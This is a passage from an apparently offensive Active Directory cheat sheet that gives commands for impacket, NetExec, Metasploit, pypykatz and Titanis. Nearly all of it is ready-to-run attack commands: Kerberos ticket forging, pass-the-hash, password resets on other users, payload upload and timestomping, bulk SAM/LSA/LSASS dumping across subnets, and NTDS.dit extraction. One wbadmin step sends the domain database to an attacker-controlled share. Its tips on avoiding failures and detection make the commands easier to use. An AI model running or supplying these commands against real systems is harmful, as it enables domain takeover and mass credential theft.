Kerb select -From jdoe*.kirbi -Into all-jdoe.ccache
```

[↑ Back to Index](#index)

---

### Change Password

```bash
# impacket — user changes own password
changepasswd.py -protocol kpasswd DOMAIN/jdoe:OldPass@192.168.1.1 -newpass NewPass

# Titanis — change own password
Kerb changepw jdoe@DOMAIN 192.168.1.1 -Password OldPass NewPass

# impacket — admin resets another user's password
changepasswd.py -reset DOMAIN/admin:AdminPass@192.168.1.1 -newpass NewPass -altuser DOMAIN/jdoe

# bloodyAD — admin resets another user's password
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p AdminPass set password jdoe NewPass

# bloodyAD — pass-the-hash
bloodyAD -H 192.168.1.1 -d DOMAIN -u admin -p :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 set password jdoe NewPass

# Titanis — admin sets another user's password
Kerb setpw -UserName admin@DOMAIN -Kdc 192.168.1.1 -Password AdminPass jdoe@DOMAIN NewPass
```

[↑ Back to Index](#index)

---

### Golden / Silver Ticket

> **Titanis status:** No ticket forging. Use Metasploit `auxiliary/admin/kerberos/forge_ticket` (native Ruby) or impacket `ticketer.py`. **⚠️ Forged tickets cannot currently be loaded into Titanis** via `-Tgt` — impacket encodes TGT service principals as NT_PRINCIPAL (name type 1) but Titanis expects NT_SERVICE_INSTANCE (name type 2); a fix is pending from the developer. Use `KRB5CCNAME` + impacket (`wmiexec.py -k`, `smbclient.py -k`) directly with forged tickets for now.

```bash
# Step 1 — obtain krbtgt hash via DCSync
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -just-dc-user DOMAIN/krbtgt | grep krbtgt

# Step 1 alt — pypykatz DCSync
pypykatz smb dcsync "smb2+ntlm-password://DOMAIN\Administrator:Password123@192.168.1.1" \
  --username krbtgt

# Step 2a — forge golden ticket (Metasploit)
msf6 > use auxiliary/admin/kerberos/forge_ticket
msf6 auxiliary(forge_ticket) > run action=FORGE_GOLDEN domain=DOMAIN.LOCAL \
  domain_sid=S-1-5-21-... nthash=<krbtgt_ntlm> username=Administrator

# Step 2b — forge silver ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_SILVER domain=DOMAIN.LOCAL \
  domain_sid=S-1-5-21-... nthash=<service_ntlm> username=Administrator \
  spn=cifs/fileserver.domain.local

# Step 2c — forge diamond ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_DIAMOND domain=DOMAIN.LOCAL \
  rhosts=192.168.1.1 user=jdoe password=Password123 \
  nthash=<krbtgt_ntlm> username=Administrator

# Step 2d — forge sapphire ticket (Metasploit)
msf6 auxiliary(forge_ticket) > run action=FORGE_SAPPHIRE domain=DOMAIN.LOCAL \
  rhosts=192.168.1.1 user=jdoe password=Password123 \
  nthash=<krbtgt_ntlm> username=Administrator

# Step 2e — forge golden ticket (impacket)
ticketer.py -nthash <krbtgt_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL Administrator

# Step 3 — use forged ticket with impacket (Titanis cannot load externally forged ccache files)
export KRB5CCNAME=Administrator.ccache
wmiexec.py -k -no-pass DOMAIN/Administrator@dc01.domain.local "whoami"
smbclient.py -k -no-pass DOMAIN/Administrator@dc01.domain.local

# Silver ticket (impacket) — use with KRB5CCNAME + impacket
ticketer.py -nthash <service_ntlm> -domain-sid S-1-5-21-... \
  -domain DOMAIN.LOCAL -spn cifs/fileserver.domain.local Administrator
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass DOMAIN/Administrator@fileserver.domain.local

# Titanis — non-functional with forged tickets currently; shown for API reference only
# (-Tgt rejects impacket ccache due to NT_PRINCIPAL vs NT_SERVICE_INSTANCE name type; fix pending)
# Wmi exec dc01 -ha 192.168.1.1 -UserName Administrator@DOMAIN \
#   -TicketCache Administrator.ccache "whoami"
# Smb2Client ls \\fileserver.domain.local\C$ -UserName Administrator@DOMAIN \
#   -TicketCache Administrator.ccache
```

[↑ Back to Index](#index)

---

## 3. SMB / File Operations

### List Shares

```bash
# impacket
smbclient.py -shares DOMAIN/jdoe:Password123@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --shares

# smbclient
smbclient -L //192.168.1.10 -U 'DOMAIN\jdoe%Password123'

# aiosmb — password
asmbshareenum "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"

# aiosmb — pass-the-hash
asmbshareenum "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# aiosmb — Kerberos ccache
asmbshareenum "smb+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10/?dc=192.168.1.1&ccache=jdoe.ccache"

# Titanis
Smb2Client enumshares \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Browse / List Files

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10

# smbclient-ng
smbclient-ng -u jdoe -p Password123 --domain DOMAIN --host 192.168.1.10

# aiosmb — interactive client (ls, cd, get, put, services, sessions, whoami, tasks built-in)
asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"

# aiosmb — pass-the-hash
asmbclient "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# Titanis
Smb2Client ls \\192.168.1.10\Share -UserName jdoe -UserDomain DOMAIN -Password Password123
Smb2Client ls \\192.168.1.10\C$   -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Download a File

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# smb: \> get Windows\System32\drivers\etc\hosts hosts.txt

# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'get Windows\System32\drivers\etc\hosts hosts.txt'

# aiosmb — password (full path embedded in URL after the host)
asmbgetfile "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/C$/Windows/System32/drivers/etc/hosts" \
  -o hosts.txt

# aiosmb — pass-the-hash
asmbgetfile "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10/C$/Windows/System32/drivers/etc/hosts" \
  -o hosts.txt

# Titanis
Smb2Client get \\192.168.1.10\C$\Windows\System32\drivers\etc\hosts hosts.txt \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Download with Backup Semantics

For locked or protected files (NTDS.dit, SYSTEM hive, etc.).

```bash
# Titanis
Smb2Client get \\192.168.1.10\C$\Windows\NTDS\ntds.dit ntds.dit \
  -UserName jdoe -UserDomain DOMAIN -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Upload a File

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# smb: \> put payload.exe Windows\Temp\payload.exe

# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'put payload.exe Windows\Temp\payload.exe'

# Titanis
Smb2Client put payload.exe \\192.168.1.10\C$\Windows\Temp\payload.exe \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Create / Remove Directories and Files

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# smb: \> mkdir Windows\Temp\newdir
# smb: \> rmdir Windows\Temp\newdir
# smb: \> del Windows\Temp\file.txt

# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'mkdir Windows\Temp\newdir'
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'rmdir Windows\Temp\newdir'
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' -c 'del Windows\Temp\file.txt'

# Titanis
Smb2Client mkdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
Smb2Client rmdir \\192.168.1.10\C$\Windows\Temp\newdir  -UserName jdoe -UserDomain DOMAIN -Password Password123
Smb2Client rm    \\192.168.1.10\C$\Windows\Temp\file.txt -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### List Named Pipes

```bash
# impacket
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# smb: \> cd \pipe\
# smb: \pipe\> ls

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --pipe

# Titanis
Smb2Client ls \\192.168.1.10\IPC$ -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Pass the Hash — SMB

```bash
# impacket
smbclient.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 DOMAIN/jdoe@192.168.1.10

# NetExec
netexec smb 192.168.1.10 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# aiosmb
asmbclient "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# Titanis
Smb2Client ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN \
  -NtlmHash A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5
```

[↑ Back to Index](#index)

---

### SMB over SOCKS5

```bash
# impacket
proxychains smbclient.py DOMAIN/jdoe:Password123@192.168.1.10

# aiosmb — SOCKS5 (native, no proxychains needed)
asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/?proxyhost=127.0.0.1&proxyport=1080"

# aiosmb — SOCKS4
asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10/?proxytype=socks4&proxyhost=127.0.0.1&proxyport=1080"

# Titanis
Smb2Client ls \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123 \
  -Socks5 127.0.0.1:1080
```

[↑ Back to Index](#index)

---

### Enumerate Open Files / Sessions

```bash
# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sessions
netexec smb 192.168.1.10 -u jdoe -p Password123 --loggedon-users

# aiosmb — interactive client commands
asmbclient "smb+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
# smb> sessions
# smb> files

# Titanis
Smb2Client enumopenfiles \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
Smb2Client enumsessions  \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Remote File Timestomping

```bash
# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
  touch --time "2022-01-01 00:00:00" C$/Windows/Temp/payload.exe

# Titanis
Smb2Client touch \\192.168.1.10\C$\Windows\Temp\payload.exe \
  -UserName jdoe -UserDomain DOMAIN -Password Password123 -Time "2022-01-01 00:00:00"
```

[↑ Back to Index](#index)

---

### VSS Snapshot Enumeration

```bash
# impacket — interactive shell command
smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
# list_snapshots C$

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN snapshots C$

# Titanis
Smb2Client enumsnapshots \\192.168.1.10\C$ -UserName jdoe -UserDomain DOMAIN -Password Password123
```

> **@GMT snapshot path access:** `@GMT-...` is not a real directory — Windows SRV.SYS intercepts the token in the SMB2 CREATE path and redirects to the VSS snapshot. Tools that navigate paths component-by-component (including `Smb2Client get`) will get `STATUS_OBJECT_PATH_NOT_FOUND`. Use smbclient.py or native smbclient, which send the full path in a single CREATE request:
>
> ```bash
> # impacket smbclient.py — list_snapshots then get
> smbclient.py DOMAIN/jdoe:Password123@192.168.1.10
> # list_snapshots C$
> # get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit
>
> # native smbclient (Samba)
> smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
>   -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
> ```

[↑ Back to Index](#index)

---

### NTFS Alternate Data Stream (ADS) Enumeration

```bash
# smbclient
smbclient //192.168.1.10/C$ -U 'DOMAIN\jdoe%Password123' \
  -c 'allinfo Windows\Temp\file.txt'

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN \
  streams C$/Windows/Temp/file.txt

# Titanis
Smb2Client enumstreams \\192.168.1.10\C$\Windows\Temp\file.txt \
  -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Server NIC Enumeration

```bash
# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --interfaces

# smbclient-ng
smbclient-ng --host 192.168.1.10 -u jdoe -p Password123 --domain DOMAIN nics

# Titanis
Smb2Client enumnics \\192.168.1.10 -UserName jdoe -UserDomain DOMAIN -Password Password123
```

[↑ Back to Index](#index)

---

### Bulk Share Enumeration

```bash
# NetExec
netexec smb 192.168.1.0/24 -u jdoe -p Password123 --shares

# aiosmb — async subnet scanner (faster than looping)
# syntax: asmbscanner [global_opts] {file|brute|list} <url> <ip/cidr>
# results written to TSV files in output dir (-o dir, default: current dir)
asmbscanner -w 5 --no-progress file \
  "smb+ntlm-password://DOMAIN\jdoe:Password123@" 192.168.1.0/24

# aiosmb — pass-the-hash
asmbscanner -w 5 --no-progress file \
  "smb+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@" 192.168.1.0/24

# Titanis
while IFS= read -r host; do
  echo "=== $host ==="
  smb2 enumshares "\\\\${host}" -UserName jdoe -UserDomain DOMAIN \
    -Password Password123 2>/dev/null
done < hosts.txt
```

[↑ Back to Index](#index)

---

## 4. Credential Dumping

### LSASS Minidump Parsing (offline)

```bash
# pypykatz — parse captured LSASS minidump
pypykatz lsa minidump lsass.DMP

# Output to JSON
pypykatz lsa minidump lsass.DMP -o lsass_creds.json --json

# Extract Kerberos tickets to ccache files (loadable via Titanis -TicketCache)
pypykatz lsa minidump lsass.DMP -k /tmp/kerberos_tickets/

# Extract DPAPI masterkeys from LSASS memory
pypykatz lsa minidump lsass.DMP -o dpapi_keys.json

# pypykatz — live LSASS dump + parse remotely over SMB (no minidump file needed)
pypykatz smb lsassdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
pypykatz smb lsassdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# NetExec — remote LSASS dump via SMB
netexec smb 192.168.1.10 -u jdoe -p Password123 -M lsassy
```

[↑ Back to Index](#index)

---

### Dump SAM Hashes

```bash
# impacket
secretsdump.py -sam DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit
msf6 > use auxiliary/gather/windows_secrets_dump
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=SAM

# Metasploit — pass-the-hash
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  action=SAM

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sam

# pypykatz — remote SAM dump via SMB
pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10" --sam
pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --sam

# Titanis — requires -BackupSemantics even as domain admin; without it → ACCESS_DENIED
Reg dumpsam 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics

# Titanis — backup operator (no admin required, -BackupSemantics still required)
Reg dumpsam 192.168.1.10 -UserName backupuser@DOMAIN \
  -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Dump LSA Secrets

```bash
# impacket
secretsdump.py -lsa DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=LSA

# Metasploit — pass-the-hash
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=aad3b435b51404eeaad3b435b51404ee:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  action=LSA

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --lsa

# pypykatz — remote LSA secrets dump via SMB
pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10" --lsa
pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10" --lsa

# Titanis — requires -BackupSemantics; without it → ACCESS_DENIED
Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Dump SAM + LSA Together

```bash
# impacket
secretsdump.py DOMAIN/jdoe:Password123@192.168.1.10

# Metasploit — ALL action (SAM + LSA + cached creds)
msf6 auxiliary(windows_secrets_dump) > run rhosts=192.168.1.10 smbdomain=DOMAIN \
  smbuser=jdoe smbpass=Password123 action=ALL

# NetExec
netexec smb 192.168.1.10 -u jdoe -p Password123 --sam --lsa

# pypykatz — remote registry dump via SMB
pypykatz smb regdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
pypykatz smb regdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"
pypykatz smb regdump "smb2+kerberos+ccache://DOMAIN\jdoe:@192.168.1.10?ccache=jdoe.ccache"

# pypykatz — remote LSASS dump + parse via SMB
pypykatz smb lsassdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"
pypykatz smb lsassdump "smb2+ntlm-nt://DOMAIN\jdoe:A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5@192.168.1.10"

# pypykatz — combined (SAM + LSA + LSASS in one call)
pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@192.168.1.10"

# Titanis — requires -BackupSemantics for both; without it → ACCESS_DENIED
Reg dumpsam        192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
Reg dumplsasecrets 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics
```

[↑ Back to Index](#index)

---

### Bulk SAM / LSA Dump Across Hosts

```bash
# NetExec
netexec smb 192.168.1.0/24 -u jdoe -p Password123 --sam --lsa

# NetExec — pass-the-hash
netexec smb 192.168.1.0/24 -u jdoe -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --sam --lsa

# pypykatz — combined SAM + LSA + LSASS across a host list
while IFS= read -r host; do
  echo "=== $host ===" >> pypykatz_dump.txt
  pypykatz smb secretsdump "smb2+ntlm-password://DOMAIN\jdoe:Password123@${host}" \
    >> pypykatz_dump.txt 2>&1
done < hosts.txt

# Titanis
while IFS= read -r host; do
  echo "=== $host ===" | tee -a sam_dump.txt
  reg dumpsam        "$host" -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics >> sam_dump.txt 2>&1
  reg dumplsasecrets "$host" -UserName jdoe@DOMAIN -Password Password123 -BackupSemantics >> lsa_dump.txt 2>&1
done < hosts.txt
```

[↑ Back to Index](#index)

---

### NTDS Dump via VSS Snapshot

> Requests a VSS shadow copy on the DC and reads NTDS.dit + SYSTEM hive directly from the snapshot. Does not use replication — useful when DCSync is blocked or monitored.

> **⚠️ `-use-vss` limitation:** secretsdump's `-use-vss` uses smbexec internally to run vssadmin and collect output. smbexec service creation requires SVCCTL `PacketPrivacy` auth level, which secretsdump does not negotiate — service creation fails silently and the output file is never written. Use `-use-remoteSSWMI -use-remoteSSWMI-NTDS` instead, which bypasses SVCCTL entirely.

```bash
# impacket — VSS method (default exec via smbexec)
# ⚠️ Fails if SVCCTL requires PacketPrivacy; use -use-remoteSSWMI-NTDS instead
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -use-vss

# impacket — VSS with explicit exec method
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -use-vss \
  -exec-method wmiexec

# impacket — VSS pass-the-hash
secretsdump.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  DOMAIN/Administrator@192.168.1.1 -use-vss

# impacket — VSS with output file + useful display flags
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -use-vss \
  -outputfile ntds_dump -user-status -pwd-last-set

# impacket — WMI shadow snapshot (preferred VSS method; no SVCCTL / smbexec required)
# Creates VSS copy via Win32_ShadowCopy WMI class, downloads SAM/SYSTEM/SECURITY locally
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 -use-remoteSSWMI

# impacket — WMI shadow snapshot including NTDS.dit (DC-specific)
# -use-remoteSSWMI-NTDS must be used together with -use-remoteSSWMI
secretsdump.py DOMAIN/Administrator:Password123@192.168.1.1 \
  -use-remoteSSWMI -use-remoteSSWMI-NTDS

# impacket — WMI shadow pass-the-hash
secretsdump.py -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  DOMAIN/Administrator@192.168.1.1 -use-remoteSSWMI -use-remoteSSWMI-NTDS

# NetExec — VSS method
netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds vss

# NetExec — VSS pass-the-hash
netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 --ntds vss

# NetExec — VSS, enabled accounts only
netexec smb 192.168.1.1 -u Administrator -p Password123 --ntds vss --enabled

# Titanis — enumerate existing snapshots
Smb2Client enumsnapshots \\192.168.1.1\C$ -UserName Administrator -UserDomain DOMAIN -Password Password123

# Retrieve files from snapshot — use token from enumsnapshots or vssadmin output
smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
# list_snapshots C$
# get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit
# get @GMT-2024.01.01-00.00.00\Windows\System32\config\SYSTEM SYSTEM

# native smbclient (Samba)
smbclient //192.168.1.1/C$ -U 'DOMAIN\Administrator%Password123' \
  -c 'get @GMT-2024.01.01-00.00.00\Windows\NTDS\ntds.dit ntds.dit'
smbclient //192.168.1.1/C$ -U 'DOMAIN\Administrator%Password123' \
  -c 'get @GMT-2024.01.01-00.00.00\Windows\System32\config\SYSTEM SYSTEM'

# Parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

[↑ Back to Index](#index)

---

### NTDS Dump via IFM (ntdsutil)

> Uses `ntdsutil ifm` to create an Install-From-Media set on the DC — a legitimate AD operation that produces a copy of NTDS.dit. Less noisy than VSS in some environments since ntdsutil is a built-in AD admin tool.

> **⚠️ WMI exec limitation:** ntdsutil requires `SeBackupPrivilege` and full token elevation in the executing process. WMI-spawned processes do not receive a fully elevated token even for domain admin — ntdsutil returns `Access is denied` regardless of credentials. If WMI-based execution fails, use `secretsdump -use-remoteSSWMI -use-remoteSSWMI-NTDS` or the diskshadow LOLBin instead. The NetExec `-M ntdsutil` module may succeed via its default exec method on some targets.

```bash
# impacket — trigger ntdsutil via wmiexec, pull files, parse
# ⚠️ ntdsutil must be called by full path when invoked via WMI: C:\Windows\System32\ntdsutil.exe
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q"
# Wait for completion, then retrieve
smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
# smb: \> get Windows\Temp\ifm\Active Directory\ntds.dit ntds.dit
# smb: \> get Windows\Temp\ifm\registry\SYSTEM SYSTEM

# NetExec — ntdsutil module (handles exec + retrieval + parsing automatically)
netexec smb 192.168.1.1 -u Administrator -p Password123 -M ntdsutil

# NetExec — ntdsutil module pass-the-hash
netexec smb 192.168.1.1 -u Administrator -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -M ntdsutil

# Titanis — exec via WMI, retrieve via SMB, parse offline
# ⚠️ WMI process token elevation issue; may return Access is denied. Use diskshadow or -use-remoteSSWMI-NTDS instead.
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
  "C:\Windows\System32\ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ifm\" q q"
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\Active Directory\ntds.dit" ntds.dit \
  -UserName Administrator@DOMAIN -Password Password123
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ifm\registry\SYSTEM" SYSTEM \
  -UserName Administrator@DOMAIN -Password Password123
# Clean up
Smb2Client rmdir "\\192.168.1.1\C$\Windows\Temp\ifm" \
  -UserName Administrator@DOMAIN -Password Password123

# Parse offline
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

[↑ Back to Index](#index)

---

### NTDS Dump via wbadmin (Windows Server Backup)

> `wbadmin` is a built-in Windows LOLBin that uses VSS internally to back up files to a network share — no local staging, no code execution artefacts beyond the backup job. Works for Backup Operators (no DA required). Requires the share to be writable from the DC.

> **⚠️ Requires `WindowsServerBackup` Windows feature.** The wbadmin binary is present as a stub even when the feature is not installed — it will hang or fail silently. Verify the feature is active before attempting: `Get-WindowsFeature WindowsServerBackup` (PowerShell) or `DISM /online /Get-FeatureInfo /FeatureName:WindowsServerBackup`. If `InstallState` is not `Installed`, this method will not work.

```bash
# Check feature state (run via WMI exec before proceeding)
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "powershell -c \"(Get-WindowsFeature WindowsServerBackup).InstallState\""

# Step 1 — trigger backup of NTDS.dit from DC to an attacker-controlled share
# (run via wmiexec / scm / any exec method)
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"

# Titanis — exec via WMI
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
  "wbadmin start backup -backupTarget:\\\\<attacker-ip>\\share -include:C:\\Windows\\NTDS\\ntds.dit -quiet"

# Step 2 — list backup versions to get the version identifier
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 "wbadmin get versions"

# Step 3 — recover the NTDS.dit from the backup
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "wbadmin start recovery -version:<VERSION> -items:C:\\Windows\\NTDS\\ntds.dit \
  -itemType:File -recoveryTarget:C:\\Windows\\Temp\\ -notRestoreAcl -quiet"

# Step 4 — also need SYSTEM hive
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\SYSTEM"

# Step 5 — retrieve both files and parse offline
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\ntds.dit" ntds.dit \
  -UserName Administrator@DOMAIN -Password Password123
Smb2Client get "\\192.168.1.1\C$\Windows\Temp\SYSTEM" SYSTEM \
  -UserName Administrator@DOMAIN -Password Password123
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

[↑ Back to Index](#index)

---

### NTDS Dump via Diskshadow

> `diskshadow.exe` is a built-in Windows LOLBin that interacts with VSS directly. Useful when `vssadmin` is blocked or monitored — diskshadow is less commonly flagged. Backup Operators can use it without full DA. Requires uploading a script file to the DC.

> **⚠️ Script file must have CRLF line endings.** diskshadow.exe rejects LF-only scripts. Run `unix2dos shadow.dsh` before uploading, or create the file with `printf` using `\r\n` explicitly.

> **⚠️ Titanis `Wmi exec` redirect note:** Do not include `>` in the `Wmi exec` command argument — Titanis parses `>` specially and the process creation fails with `ERROR_FILE_NOT_FOUND`. If you need to capture output, write a `.bat` file with the redirect and upload it separately, then execute the bat file.

```bash
# Step 1 — create diskshadow script locally (CRLF required)
cat > shadow.dsh << 'EOF'
set context persistent nowriters
set metadata C:\Windows\Temp\meta.cab
add volume C: alias trophy
create
expose %trophy% Z:
EOF
unix2dos shadow.dsh   # ← required; diskshadow rejects LF-only scripts

# Step 2 — upload script to DC
smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
# smb: \> put shadow.dsh Windows\Temp\shadow.dsh

# Titanis — upload
Smb2Client put shadow.dsh "\\192.168.1.1\C$\Windows\Temp\shadow.dsh" \
  -UserName Administrator@DOMAIN -Password Password123

# Step 3 — execute diskshadow and copy NTDS.dit
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "diskshadow.exe /s C:\Windows\Temp\shadow.dsh"
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "cmd.exe /c copy Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit"
wmiexec.py DOMAIN/Administrator:Password123@192.168.1.1 \
  "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"

# Titanis — exec (no > redirect in command arg; use cmd.exe /c for copy)
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
  "diskshadow.exe /s C:\Windows\Temp\shadow.dsh"
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
  "cmd.exe /c copy Z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit"
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN -Password Password123 \
  "cmd.exe /c copy Z:\Windows\System32\config\SYSTEM C:\Windows\Temp\SYSTEM"

# Step 4 — retrieve files
smbclient.py DOMAIN/Administrator:Password123@192.168.1.1
